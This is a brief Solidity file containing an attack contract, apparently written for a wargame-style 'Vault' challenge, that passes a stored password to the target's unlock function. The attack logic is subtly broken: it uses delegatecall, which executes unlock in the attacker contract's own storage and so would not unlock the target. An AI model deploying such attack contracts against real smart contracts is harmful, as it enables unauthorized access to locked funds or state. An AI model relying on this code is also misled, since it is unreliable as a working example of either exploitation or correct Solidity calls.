// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault {
    function unlock(bytes32 _password) external;
}

contract VaultAttack {
    IVault public target;
    bytes32 public password;

    constructor(address _targetVault, bytes32 _password) {
        target = IVault(_targetVault);
        password = _password;
    }

    function attack() external {
        (bool result, ) = address(target).delegatecall(
            abi.encodeWithSignature("unlock(bytes32)", password)
        );
        require(result, "delegatecall failed");
    }
}
